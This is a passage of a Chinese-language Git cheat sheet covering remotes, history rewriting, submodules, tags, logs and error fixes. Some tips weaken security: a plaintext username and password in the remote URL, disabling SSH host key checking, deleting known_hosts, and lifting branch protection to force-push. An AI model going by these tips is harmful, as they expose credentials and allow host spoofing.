precomposeunicode = true [remote \u0026#34;origin\u0026#34;] -\turl = https://github.com/username/rep.git +\turl = https://用户名:密码@github.com/username/rep.git \tfetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;master\u0026#34;] remote = origin merge = refs/heads/master   文件推向3个git库 1. 增加3个远程库地址\n1 2 3  git remote add origin https://github.com/JSLite/JSLite.git git remote set-url --add origin https://gitlab.com/wang/JSLite.js.git git remote set-url --add origin https://oschina.net/wang/JSLite.js.git   2. 删除其中一个 set-url 地址\n1 2 3  usage: git remote set-url [--push] \u0026lt;name\u0026gt; \u0026lt;newurl\u0026gt; [\u0026lt;oldurl\u0026gt;] or: git remote set-url --add \u0026lt;name\u0026gt; \u0026lt;newurl\u0026gt; or: git remote set-url --delete \u0026lt;name\u0026gt; \u0026lt;url\u0026gt;   git remote set-url --delete origin https://oschina.net/wang/JSLite.js.git\n3.推送代码\n1 2  git push origin master git push -f origin master # 强制推送    4.拉代码\n只能拉取 origin 里的一个url地址，这个fetch-url\n默认为你添加的到 origin的第一个地址\n1 2 3 4 5 6 7 8  git pull origin master git pull --all # 获取远程所有内容包括tag  git pull origin next:master # 取回origin主机的next分支，与本地的master分支合并  git pull origin next # 远程分支是与当前分支合并  # 上面一条命令等同于下面两条命令  git fetch origin git merge origin/next   如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致git pull不知不觉删除了本地分支。\n但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。\n1 2 3 4  $ git pull -p # 等同于下面的命令 $ git fetch --prune origin $ git fetch -p   5.更改pull\n只需要更改config文件里，那三个url的顺序即可，fetch-url会直接对应排行第一的那个utl连接。\n修改远程仓库地址 1 2  git remote remove origin # 删除该远程路径  git remote add origin git@jslite.github.com:JSLite/JSLite.git # 添加远程路径    撤销远程记录 1 2  git reset --hard HEAD~1 # 撤销一条记录  git push -f origin HEAD:master # 同步到远程仓库    放弃本地的文件修改 1  git reset --hard FETCH_HEAD # FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull   git reset --hard FETCH_HEAD 出现错误\n1 2 3 4 5 6  git pull You are not currently on a branch, so I cannot use any \u0026#39;branch.\u0026lt;branchname\u0026gt;.merge\u0026#39; in your configuration file. Please specify which remote branch you want to use on the command line and try again (e.g. \u0026#39;git pull \u0026lt;repository\u0026gt; \u0026lt;refspec\u0026gt;\u0026#39;). See git-pull(1) FOR details.   解决方法：\n1 2  git checkout -b temp # 新建+切换到temp分支  git checkout master   最简单放弃本地修改内容 1 2 3 4 5 6  # 如果有的修改以及加入暂存区的话 git reset --hard # 还原所有修改，不会删除新增的文件 git checkout . # 下面命令会删除新增的文件 git clean -xdf   通过存储暂存区stash，在删除暂存区的方法放弃本地修改。\n1  git stash \u0026amp;\u0026amp; git stash drop   回退到某一个版本 1 2 3 4  git reset --hard \u0026lt;hash\u0026gt; # 例如 git reset --hard a3hd73r # --hard代表丢弃工作区的修改，让工作区与版本代码一模一样，与之对应， # --soft参数代表保留工作区的修改。   搜索 commit 历史记录 1 2  git log --grep=224 # 这条命令是查看含有 \u0026#34;224\u0026#34; 关键字的 git commit    回滚到某个commit提交 1 2  git revert HEAD~1 # 撤销一条记录 会弹出 commit 编辑 git push # 提交回滚   去掉某个commit 1 2  # 实质是新建了一个与原来完全相反的commit，抵消了原来commit的效果 git revert \u0026lt;commit-hash\u0026gt;   把 A 分支的某一个 commit，放到 B 分支上 对两个分支，同时都拥有的文件，进行修改后，再同时 commit 到这两个分支，比如 master 分支和 branch1 分支，都拥有文件 test.js ，在 master 或者 branch1 分支下对 test.js 进行修改后，把修改的 test.js 同时提交到 master 分支和 branch1 分支。\n1  git checkout \u0026lt;branch-name\u0026gt; \u0026amp;\u0026amp; git cherry-pick \u0026lt;commit-id\u0026gt;   获取最近一次提交的 commit id 1 2  git rev-parse HEAD # e10721cb8859b2cd340d31a52ef4bf4b9629ddda git rev-parse --short HEAD # e10721c   两个 git 仓库合并 现在有两个仓库 kktjs/kkt 和 kktjs/kkt-next 我们需要将 kkt-next 仓库合并到 kkt 并保留 kkt-next 的所有提交内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # 1. 克隆主仓库代码 git clone git@github.com:kktjs/kkt.git # 2. 将 kkt-next 作为远程仓库，添加到 kkt 中，设置别名为 other git remote add other git@github.com:kktjs/kkt-next.git # 3. 从 kkt-next 仓库中拉取数据到本仓库 git fetch other # 4. 将 kkt-next 仓库拉取的 master 分支作为新分支 checkout 到本地，新分支名设定为 kkt-next git checkout -b kkt-next other/master # 5. 切换回 kkt 的 master 分支 git checkout master # 6. 将 kkt-next 合并入 kkt 的 master 分支 git merge kkt-next # 如果第 6 步报错 `fatal: refusing to merge unrelated histories` # 请执行下面命令 ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓ git merge kkt-next --allow-unrelated-histories   在合并时有可能两个分支对同一个文件都做了修改，这时需要解决冲突，对文本文件来说很简单，根据需要对冲突的位置进行处理就可以。对于二进制文件，需要用到如下命令:\n1 2 3  git checkout --theirs YOUR_BINARY_FILES # 保留需要合并进来的分支的修改 git checkout --ours YOUR_BINARY_FILES # 保留自己的修改 git add YOUR_BINARY_FILES   合并多个commit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # 这个命令，将最近4个commit合并为1个，HEAD代表当前版本。 # 将进入VIM界面，你可以修改提交信息。 git rebase -i HEAD~4 # 可以看到其中分为两个部分，上方未注释的部分是填写要执行的指令， # 而下方注释的部分则是指令的提示说明。指令部分中由前方的命令名称、commit hash 和 commit message 组成 # 当前我们只要知道 pick 和 squash 这两个命令即可。 # --\u0026gt; pick 的意思是要会执行这个 commit # --\u0026gt; squash 的意思是这个 commit 会被合并到前一个commit # 我们将 需要保留的 这个 commit 前方的命令改成 squash 或 s，然后输入:wq以保存并退出 # 这是我们会看到 commit message 的编辑界面 # 其中, 非注释部分就是两次的 commit message, 你要做的就是将这两个修改成新的 commit message。 #  # 输入wq保存并推出, 再次输入git log查看 commit 历史信息，你会发现这两个 commit 已经合并了。 # 将修改强制推送到前端 git push -f origin master   修改远程Commit记录 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  git commit --amend # amend只能修改没有提交到线上的，最后一次commit记录 git rebase -i HEAD~3 # 表示要修改当前版本的倒数第三次状态 # 将要更改的记录行首单词 pick 改为 edit pick 96dc3f9 doc: Update quick-start.md pick f1cce8a test(Transition):Add transition test (#47) pick 6293516 feat(Divider): Add Divider component. # Rebase eeb03a4..6293516 onto eeb03a4 (3 commands) # # Commands: # p, pick = use commit # r, reword = use commit, but edit the commit message # e, edit = use commit, but stop for amending # s, squash = use commit, but meld into previous commit # f, fixup = like \u0026#34;squash\u0026#34;, but discard this commit\u0026#39;s log message # x, exec = run command (the rest of the line) using shell # d, drop = remove commit   保存并退出，会弹出下面提示\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # You can amend the commit now, with #  # git commit --amend #  # Once you are satisfied with your changes, run #  # git rebase --continue # 通过这条命令进入编辑页面更改commit，保存退出 git commit --amend # 保存退出确认修改，继续执行 rebase,  git rebase --continue # 如果修改多条记录反复执行上面两条命令直到完成所有修改 # 最后，确保别人没有提交进行push，最好不要加 -f 强制推送 git push -f origin master   利用commit关闭一个issue 这个功能在Github上可以玩儿，Gitlab上特别老的版本不能玩儿哦，那么如何跟随着commit关闭一个issue呢? 在confirm merge的时候可以使用一下命令来关闭相关issue:\nfixes #xxx、 fixed #xxx、 fix #xxx、 closes #xxx、 close #xxx、 closed #xxx、\n新建一个空分支 1 2 3 4 5 6  # 这种方式新建的分支(gh-pages)是没有 commit 记录的 git checkout --orphan gh-pages # 删除新建的gh-pages分支原本的内容，如果不删除，提交将作为当前分支的第一个commit git rm -rf . # 查看一下状态 有可能上面一条命令，没有删除还没有提交的的文件 git state   添加忽略文件 1  echo node_modules/ \u0026gt;\u0026gt; .gitignore   忽略某个文件的改动 1 2  git update-index --assume-unchanged path/to/file # 关闭 track 指定文件的改动，也就是 Git 将不会在记录这个文件的改动 git update-index --no-assume-unchanged path/to/file # 恢复 track 指定文件的改动   同步fork的上游仓库 Github教程同步fork教程，在Github上同步一个分支(fork)\n设置添加多个远程仓库地址。\n在同步之前，需要创建一个远程点指向上游仓库(repo).如果你已经派生了一个原始仓库，可以按照如下方法做。\n1 2 3 4 5 6 7 8 9 10 11 12  $ git remote -v # List the current remotes （列出当前远程仓库） # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) $ git remote add upstream https://github.com/otheruser/repo.git # Set a new remote (设置一个新的远程仓库) $ git remote -v # Verify new remote (验证新的原唱仓库) # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) # upstream https://github.com/otheruser/repo.git (fetch) # upstream https://github.com/otheruser/repo.git (push)   同步更新仓库内容\n同步上游仓库到你的仓库需要执行两步：首先你需要从远程拉去，之后你需要合并你希望的分支到你的本地副本分支。从上游的存储库中提取分支以及各自的提交内容。 master 将被存储在本地分支机构 upstream/master\n1 2 3 4 5 6 7  git fetch upstream # remote: Counting objects: 75, done. # remote: Compressing objects: 100% (53/53), done. # remote: Total 62 (delta 27), reused 44 (delta 9) # Unpacking objects: 100% (62/62), done. # From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY # * [new branch] master -\u0026gt; upstream/master   检查你的 fork\u0026rsquo;s 本地 master 分支\n1 2  git checkout master # Switched to branch \u0026#39;master\u0026#39;   合并来自 upstream/master 的更改到本地 master 分支上。 这使你的前 fork\u0026rsquo;s master 分支与上游资源库同步，而不会丢失你本地修改。\n1 2 3 4 5 6 7 8  git merge upstream/master # Updating a422352..5fdff0f # Fast-forward # README | 9 ------- # README.md | 7 ++++++ # 2 files changed, 7 insertions(+), 9 deletions(-) # delete mode 100644 README # create mode 100644 README.md   手动合并冲突的 Pull Request 以 tsbbjs/tsbb 为例，合并来自 jaywcjlove/tsbb master分支的 Pull Request。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # 1. 克隆主仓库 git clone git@github.com:tsbbjs/tsbb.git # 2. 在主仓库 master 分支切个 jaywcjlove-master 分支出来，并且切换到 jaywcjlove-master 分支 git checkout -b jaywcjlove-master master # 3. 获取 jaywcjlove/tsbb 仓库 master 分支最新代码 git pull https://github.com/jaywcjlove/tsbb.git master # ⚠️ 注意下面是输出内容： # ---------------------- # Auto-merging src/babel/transform.ts # CONFLICT (content): Merge conflict in src/babel/transform.ts # ---------------------- # ⚠️ 注意上面 CONFLICT 标识是有冲突无法自动合并的代码，根据路径进入代码手动合并 # 4. 合并完成之后，进行 commit 说明合并内容 git commit -m \u0026#34;Merge branch \u0026#39;master\u0026#39; of github.com:jaywcjlove/tsbb #3\u0026#34; # 5. 切换到 master 分支，如果是 PR 其它分支，这里就切其它分支 git checkout master # 6. 合并 jaywcjlove-master 分支的代码 git merge --no-ff jaywcjlove-master # 7. 提交代码 git push origin master   修改作者名 1  git commit --amend --author=\u0026#39;Author Name \u0026lt;email@address.com\u0026gt;\u0026#39;   批量修改历史commit中的名字和邮箱 这是 Github官方教程\n1.克隆仓库\n注意参数，这个不是普通的clone，clone下来的仓库并不能参与开发\n1 2  git clone --bare https://github.com/user/repo.git cd repo.git   2.命令行中运行代码\nOLD_EMAIL原来的邮箱\nCORRECT_NAME更正的名字\nCORRECT_EMAIL更正的邮箱\n将下面代码复制放到命令行中执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  git filter-branch -f --env-filter \u0026#39; OLD_EMAIL=\u0026#34;wowohoo@qq.com\u0026#34; CORRECT_NAME=\u0026#34;小弟调调\u0026#34; CORRECT_EMAIL=\u0026#34;更正的邮箱@qq.com\u0026#34; if [ \u0026#34;$GIT_COMMITTER_EMAIL\u0026#34; = \u0026#34;$OLD_EMAIL\u0026#34; ] then export GIT_COMMITTER_NAME=\u0026#34;$CORRECT_NAME\u0026#34; export GIT_COMMITTER_EMAIL=\u0026#34;$CORRECT_EMAIL\u0026#34; fi if [ \u0026#34;$GIT_AUTHOR_EMAIL\u0026#34; = \u0026#34;$OLD_EMAIL\u0026#34; ] then export GIT_AUTHOR_NAME=\u0026#34;$CORRECT_NAME\u0026#34; export GIT_AUTHOR_EMAIL=\u0026#34;$CORRECT_EMAIL\u0026#34; fi \u0026#39; --tag-name-filter cat -- --branches --tags   执行过程\n1 2 3  Rewrite 160d4df2689ff6df3820563bfd13b5f1fb9ba832 (479/508) (16 seconds passed, remaining 0 predicted) Ref \u0026#39;refs/heads/dev\u0026#39; was rewritten Ref \u0026#39;refs/heads/master\u0026#39; was rewritten   3.同步到远程仓库\n同步到push远程git仓库\n1  git push --force --tags origin \u0026#39;refs/heads/*\u0026#39;   我还遇到了如下面错误，lab默认给master分支加了保护，不允许强制覆盖。Project(项目)-\u0026gt;Setting-\u0026gt;Repository 菜单下面的Protected branches把master的保护去掉就可以了。修改完之后，建议把master的保护再加回来，毕竟强推不是件好事。\n1  remote: GitLab: You are not allowed to force push code to a protected branch on this project.   当上面的push 不上去的时候，先 git pull 确保最新代码\n1 2 3  git pull --allow-unrelated-histories # 或者指定分枝 git pull origin master --allow-unrelated-histories   4. 删除仓库\n1 2  cd .. rm -rf repo.git   查看两个星期内的改动 1  git whatchanged --since=\u0026#39;2 weeks ago\u0026#39;   查看某个文件历史 1 2 3 4 5  git log --pretty=oneline 文件名 # 列出文件的所有改动历史  git show c178bf49 # 某次的改动的修改记录  git log -p c178bf49 # 某次的改动的修改记录  git blame 文件名 # 显示文件的每一行是在那个版本最后修改。  git whatchanged 文件名 # 显示某个文件的每个版本提交信息：提交日期，提交人员，版本号，提交备注（没有修改细节）    查看git仓库中最近修改的分支 1  git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format=\u0026#39;%(refname:short)\u0026#39;   更新所有本地分支 1 2 3  git branch \\  --format \u0026#34;%(if)%(upstream:short)%(then)git push . %(upstream:short):%(refname:short)%(end)\u0026#34; | sh   打造自己的git命令 1 2 3 4  git config --global alias.st status git config --global alias.br branch git config --global alias.co checkout git config --global alias.ci commit   配置好后再输入git命令的时候就不用再输入一大段了，例如我们要查看状态，只需：\n1  git st   删除已经合并到 master 的分支 1  git branch --merged master | grep -v \u0026#39;^\\*\\| master\u0026#39; | xargs -n 1 git branch -d   中文乱码的解决方案 1  git config --global core.quotepath false   提交一个空文件夹 在空文件夹中建立一个文件 .gitkeep, 你就可以提交这个空文件夹了。\n新建仓库 init git init #初始化\nstatus git status #获取状态\nadd git add file # .或*代表全部添加\ngit rm --cached \u0026lt;added_file_to_undo\u0026gt; # 在commit之前撤销git add操作\ngit reset head # 好像比上面git rm --cached更方便\ncommit git commit -m \u0026quot;message\u0026quot; #此处注意乱码\nremote git remote add origin git@github.com:JSLite/test.git #添加源\npush 1 2 3  git push -u origin master # push同事设置默认跟踪分支  git push origin master git push -f origin master # 强制推送文件，缩写 -f（全写--force）   clone 1 2 3 4  git clone git://github.com/JSLite/JSLite.js.git git clone git://github.com/JSLite/JSLite.js.git --depth=1 git clone git://github.com/JSLite/JSLite.js.git mypro # 克隆到自定义文件夹  git clone [user@]example.com:path/to/repo.git/ # SSH协议还有另一种写法。    git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。git clone \u0026lt;版本库的网址\u0026gt; \u0026lt;本地目录名\u0026gt;\n1 2 3 4 5 6 7 8  $ git clone http[s]://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone git://example.com/path/to/repo.git/ $ git clone /opt/git/project.git $ git clone file:///opt/git/project.git $ git clone ftp[s]://example.com/path/to/repo.git/ $ git clone rsync://example.com/path/to/repo.git/   本地 help 1  git help config # 获取帮助信息    add 1 2  git add * # 跟踪新文件  git add -u [path] # 添加[指定路径下]已跟踪文件    rm 1 2 3 4 5  rm *\u0026amp;git rm * # 移除文件  git rm -f * # 移除文件  git rm --cached * # 取消跟踪  git mv file_from file_to # 重命名跟踪文件  git log # 查看提交记录    commit 1 2 3 4 5 6 7 8  git commit #提交更新  git commit -m \u0026#39;message\u0026#39; #提交说明  git commit -a #跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交  git commit --amend #修改最后一次提交  git commit log #查看所有提交，包括没有push的commit  git commit -m \u0026#34;#133\u0026#34; #关联issue 任意位置带上# 符号加上issue号码  git commit -m \u0026#34;fix #133\u0026#34; commit关闭issue git commit -m \u0026#39;概要描述\u0026#39;$\u0026#39;\\n\\n\u0026#39;\u0026#39;1.详细描述\u0026#39;$\u0026#39;\\n\u0026#39;\u0026#39;2.详细描述\u0026#39; #提交简要描述和详细描述    reset 1 2 3 4 5  git reset HEAD * # 取消已经暂存的文件  git reset --mixed HEAD * # 同上  git reset --soft HEAD * # 重置到指定状态，不会修改索引区和工作树  git reset --hard HEAD * # 重置到指定状态，会修改索引区和工作树  git reset -- files * # 重置index区文件    revert 1 2 3  git revert HEAD # 撤销前一次操作  git revert HEAD~ # 撤销前前一次操作  git revert commit # 撤销指定操作    checkout 1 2 3 4 5  git checkout -- file # 取消对文件的修改（从暂存区——覆盖worktree file）  git checkout branch|tag|commit -- file_name # 从仓库取出file覆盖当前分支  git checkout HEAD~1 [文件] # 将会更新 working directory 去匹配某次 commit  git checkout -- . # 从暂存区取出文件覆盖工作区  git checkout -b gh-pages 0c304c9 # 这个表示 从当前分支 commit 哈希值为 0c304c9 的节点，分一个新的分支gh-pages出来，并切换到 gh-pages    diff 1 2 3 4 5 6 7 8 9 10  git diff file # 查看指定文件的差异  git diff --stat # 查看简单的diff结果  git diff # 比较 Worktree 和 Index 之间的差异  git diff --cached # 比较Index和HEAD之间的差异  git diff HEAD # 比较Worktree和HEAD之间的差异  git diff branch # 比较Worktree和branch之间的差异  git diff branch1 branch2 # 比较两次分支之间的差异  git diff commit commit # 比较两次提交之间的差异  git diff master..test # 上面这条命令只显示两个分支间的差异  git diff master...test # 你想找出‘master’,‘test’的共有 父分支和\u0026#39;test\u0026#39;分支之间的差异，你用3个‘.\u0026#39;来取代前面的两个\u0026#39;.\u0026#39;    stash 存储当前的修改，但不用提交 commit\n1 2 3 4 5 6 7 8 9  git stash # 将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。  git stash -u # 保存当前状态，包括 untracked 的文件 git stash list # 查看保存的工作现场  git stash apply # 恢复工作现场  git stash drop # 删除stash内容 git stash clear # 删除所有的 stash git stash pop # 恢复的同时直接删除stash内容  git stash apply stash@{0} # 恢复指定的工作现场，当你保存了不只一份工作现场时。 git checkout \u0026lt;stash@{n}\u0026gt; -- \u0026lt;file-path\u0026gt; # 从 stash 中拿出某个文件的修改   merge 1  git merge --squash test # 合并压缩，将test上的commit压缩为一条    cherry-pick 1 2  git cherry-pick commit # 拣选合并，将commit合并到当前分支  git cherry-pick -n commit # 拣选多个提交，合并完后可以继续拣选下一个提交    rebase 1 2 3 4 5 6  git rebase master # 将master分之上超前的提交，变基到当前分支  git rebase --onto master 169a6 # 限制回滚范围，rebase当前分支从169a6以后的提交  git rebase --interactive # 交互模式，修改commit  git rebase --continue # 处理完冲突继续合并  git rebase --skip # 跳过  git rebase --abort # 取消合并    分支branch 删除 1 2 3 4 5 6  git push origin :branchName # 删除远程分支  git push origin --delete new # 删除远程分支new  git branch -d branchName # 删除本地分支，强制删除用-D  git branch -d test # 删除本地test分支  git branch -D test # 强制删除本地test分支  git remote prune origin # 远程删除了，本地还能看到远程存在，这条命令删除远程不存在的分支   提交 1  git push -u origin branchName # 提交分支到远程origin主机中    拉取 1 2  git fetch -p # 拉取远程分支时，自动清理 远程分支已删除，本地还存在的对应同名分支。  git fetch origin \u0026#39;+refs/heads/*:refs/heads/*\u0026#39; # 更新所有分支内容   分支合并 1 2 3 4  git merge branchName # 合并分支 - 将分支branchName和当前所在分支合并  git merge origin/master # 在本地分支上合并远程分支。  git rebase origin/master # 在本地分支上合并远程分支。  git merge test # 将test分支合并到当前分支    重命名 1  git branch -m old new # 重命名分支    查看 1 2 3 4 5 6 7  git branch # 列出本地分支  git branch -r # 列出远端分支  git branch -a # 列出所有分支  git branch -v # 查看各个分支最后一个提交对象的信息  git branch --merge # 查看已经合并到当前分支的分支  git branch --no-merge # 查看为合并到当前分支的分支  git remote show origin # 可以查看remote地址，远程分支   新建 1 2 3 4  git branch test # 新建test分支  git branch newBrach 3defc69 # 指定哈希3defc69，新建分支名字为newBrach git checkout -b newBrach origin/master # 取回远程主机的更新以后，在它的基础上创建一个新的分支  git checkout -b newBrach 3defc69 # 以哈希值3defc69，新建 newBrach 分支，并切换到该分支   连接 1 2  git branch --set-upstream dev origin/dev # 将本地dev分支与远程dev分支之间建立链接  git branch --set-upstream master origin/next # 手动建立追踪关系    分支切换 1 2 3 4  git checkout - # 快速切换分支上一个分支 git checkout test # 切换到test分支  git checkout -b test # 新建+切换到test分支  git checkout -b test dev # 基于dev新建test分支，并切换    远端 1 2 3 4 5 6 7 8  git fetch \u0026lt;远程主机名\u0026gt; \u0026lt;分支名\u0026gt; # fetch取回所有分支（branch）的更新  git fetch origin remotebranch[:localbranch] # 从远端拉去分支[到本地指定分支]  git merge origin/branch # 合并远端上指定分支  git pull origin remotebranch:localbranch # 拉去远端分支到本地分支  git push origin branch # 将当前分支，推送到远端上指定分支  git push origin localbranch:remotebranch # 推送本地指定分支，到远端上指定分支  git push origin :remotebranch # 删除远端指定分支  git checkout -b [--track] test origin/dev # 基于远端dev分支，新建本地test分支[同时设置跟踪]    submodule 克隆项目同时克隆 submodule\n1  git clone https://github.com/jaywcjlove/handbook.git --depth=1 --recurse-submodules   克隆项目，之后再手动克隆 submodule 子项目\n1 2 3 4 5 6 7 8 9  git submodule add -b gh-pages --force \u0026#39;仓库地址\u0026#39; \u0026#39;路径\u0026#39; git submodule add --force \u0026#39;仓库地址\u0026#39; \u0026#39;路径\u0026#39; # 其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。 # 注意：路径不能以 / 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone） git submodule init # 初始化 submodule git submodule update # 更新submodule(必须在根目录执行命令) git submodule update --init --recursive # 下载的工程带有submodule git submodule update --recursive --remote # 对于 git 1.8.2 或更高版本，添加了选项 --remote 以支持更新远程分支 git pull --recurse-submodules # 更新 submodule git 1.7.3 版本   当使用git clone下来的工程中带有submodule时，初始的时候，submodule的内容并不会自动下载下来的，此时，只需执行如下命令：\n1  git submodule foreach --recursive git submodule init   更新 submodule 1 2 3 4 5 6  git submodule foreach git pull # submodule 里有其他的 submodule 一次更新 git submodule foreach git pull origin master # submodule更新 git submodule foreach --recursive git submodule update git submodule update --recursive --remote git pull --recurse-submodules git submodule deinit --all -f # 清理 submodule   删除 submodule 1 2 3 4 5 6 7  git ls-files --stage \u0026lt;子项目名称路径\u0026gt; # 查看子项目 vim .gitmodules # 删除对应的 submodule vim .git/config # 删除对应的 submodule git rm --cached \u0026lt;子模块名称\u0026gt; # 删除缓存中的子项目，注意没有 `/` git rm --cached subProjectName rm -rf project/subProjectName rm .git/module/* # 删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可   转换分支 1  $ git config -f .gitmodules submodule.public.branch gh-pages   下面是更改 .gitmodules 文件内容\n1 2 3 4  [submodule \u0026#34;public\u0026#34;] path = public url = git@github.com:jaywcjlove/gitke.git branch = gh-pages   删除文件 1  git rm -rf node_modules/   remote git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。个人开发时，多源用的可能不多，但多源其实非常有用。\n1 2 3 4 5 6  git remote add origin1 git@github.com:yanhaijing/data.js.git git remote # 显示全部源  git remote -v # 显示全部源+详细信息  git remote rename origin1 origin2 # 重命名  git remote rm origin # 删除  git remote show origin # 查看指定源的全部信息    标签tag 当开发到一定阶段时，给程序打标签是非常棒的功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13  git tag -a v0.1 -m \u0026#39;my version 1.4\u0026#39; # 新建带注释标签  git push origin --tags # 一次性推送所有分支  git push origin v1.5 # 推送单个tag到orgin源上  git tag -v v1.4.2.1 # 验证标签，验证已经签署的标签 git show v1.5 # 看到对应的 GPG 签 git tag # 列出现有标签  git tag v0gi.1 # 新建标签  git checkout tagname # 切换到标签  git tag -d v0.1 # 删除标签  git push origin :refs/tags/v0.1 # 删除远程标签  git pull --all # 获取远程所有内容包括tag  git --git-dir=\u0026#39;\u0026lt;绝对地址\u0026gt;/.git\u0026#39; describe --tags HEAD # 查看本地版本信息    重命名Tag 1 2  mv .git/refs/tags/1.9.1 .git/refs/tags/v1.9.1 git push -f --tags   日志log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  git config format.pretty oneline # 显示历史记录时，每个提交的信息只显示一行  git config color.ui true # 彩色的 git 输出  git log # 查看最近的提交日志 git log --grep=224 # 这条命令是查看含有 \u0026#34;224\u0026#34; 关键字的 git commit  git log --pretty=oneline # 单行显示提交日志  git log --graph --pretty=oneline --abbrev-commit git log -num # 显示第几条log（倒数）  git reflog # 查看所有分支的所有操作记录  git log --since=1.day # 一天内的提交；你可以给出各种时间格式，比如说具体的某一天（“2008-01-15”），或者是多久以前（“2 years 1 day 3 minutes ago”）。  git log --pretty=\u0026#34;%h - %s\u0026#34; --author=自己的名字 # 查看自己的日志  git log -p -2 # 展开两次更新显示每次提交的内容差异  git log --stat # 要快速浏览其他协作者提交的更新都作了哪些改动  git log --pretty=format:\u0026#34;%h - %an, %ar : %s\u0026#34;# 定制要显示的记录格式  git log --pretty=format:\u0026#39;%h : %s\u0026#39; --date-order --graph # 拓扑顺序展示  git log --pretty=format:\u0026#39;%h : %s - %ad\u0026#39; --date=short # 日期YYYY-MM-DD显示 git log --pretty=oneline --graph --decorate --all # 展示简化的 commit 历史 git log \u0026lt;last tag\u0026gt; HEAD --pretty=format:%s # 只显示commit  git config --global format.pretty \u0026#39;%h : %s - %ad\u0026#39; --date=short #日期YYYY-MM-DD显示 写入全局配置      选项 说明 选项 说明     %H 提交对象（commit）的完整哈希字串 %ad 作者修订日期（可以用 -date= 选项定制格式）   %h 提交对象的简短哈希字串 %ar 作者修订日期，按多久以前的方式显示   %T 树对象（tree）的完整哈希字串 %cn 提交者(committer)的名字   %t 树对象的简短哈希字串 %ce 提交者的电子邮件地址   %P 父对象（parent）的完整哈希字串 %cd 提交日期   %p 父对象的简短哈希字串 %cr 提交日期，按多久以前的方式显示   %an 作者（author）的名字 %s 提交说明   %ae 作者的电子邮件地址 - -    Pretty Formats\n重写历史 1 2 3 4  git commit --amend # 改变最近一次提交  git rebase -i HEAD~3 # 修改最近三次的提交说明，或者其中任意一次  git commit --amend # 保存好了，这些指示很明确地告诉了你该干什么  git rebase --continue # 修改提交说明，退出编辑器。    1 2 3  pick f7f3f6d changed my name a bit pick 310154e updated README formatting and added blame pick a5f4a0d added cat-file   改成\n1 2  pick 310154e updated README formatting and added blame pick f7f3f6d changed my name a bit   其它 1 2  git help * # 获取命令的帮助信息  git status # 获取当前的状态，非常有用，因为git会提示接下来的能做的操作    报错问题解决 1. git fatal: protocol error: bad line length character: No s\n解决办法：更换remote地址为 http/https 的\n2. The requested URL returned error: 403 Forbidden while accessing\n解决github push错误的办法：\n1 2 3 4 5 6 7 8 9 10  #vim 编辑器打开 当前项目中的config文件 vim .git/config #修改 [remote \u0026#34;origin\u0026#34;] url = https://github.com/jaywcjlove/example.git #为下面代码 [remote \u0026#34;origin\u0026#34;] url = https://jaywcjlove@github.com/jaywcjlove/example.git   3. git status 显示中文问题\n在查看状态的时候 git status 如果是中文就显示下面的情况\n1  \\344\\272\\247\\345\\223\\201\\351\\234\\200\\346\\261\\202   解决这个问题方法是：\n1  git config --global core.quotepath false   4. The authenticity of host 192.168.0.xxx can\u0026rsquo;t be establis\n修改 /etc/ssh/ssh_config 中的 StrictHostKeyChecking 的 ask 为 no 解决问题。\n5. SSH连接时出现 Host key verification failed 的原因及解决方法\n用 OpenSSH 的人都知 ssh 会把你每个你访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH 会核对公钥。如果公钥不同，OpenSSH 会发出警告，避免你受到 DNS Hijack 之类的攻击。 SSH 对主机的 public_key 的检查等级是根据\n1 2 3  StrictHostKeyChecking=no # 最不安全的级别，当然也没有那么多烦人的提示了，相对安全的内网测试时建议使用。如果连接server的key在本地不存在，那么就自动添加到文件中（默认是known_hosts），并且给出一个警告。 StrictHostKeyChecking=ask # 默认的级别，就是出现刚才的提示了。如果连接和key不匹配，给出提示，并拒绝登录。 StrictHostKeyChecking=yes # 最安全的级别，如果连接与key不匹配，就拒绝连接，不会提示详细信息。   【解决方法1】在 .ssh/config（或者/etc/ssh/ssh_config）中配置：\n1 2  StrictHostKeyChecking no UserKnownHostsFile /dev/null   解决方法 2\n1 2  vi ~/.ssh/known_hosts # 删除对应ip的相关rsa信息 rm known_hosts # 或者直接全部删除   5. insufficient permission for adding an object to repository database .git/objects\n1 2 3  cd .git/objects ls -al sudo chown -R yourname:yourgroup *   参考资料  Git官网 Github 15分钟学习Git Git参考手册 Git简明手册 Git Magic Git Community Book 中文版 Pro Git 图解Git git-简明指南 learnGitBranching 在线学习工具 初级教程 廖雪峰的Git教程 蒋鑫老师将带你入github的大门 git详解 oschina教程 How to undo (almost) anything with Git撤销一切，汇总各种回滚撤销的场景，加强学习。 Git 教程 | 菜鸟教程runoob.com Git 本地仓库和裸仓库 沉浸式学 Git Git进阶用法，主要是rebase高级用法 成为一个git大师 高质量的Git中文教程 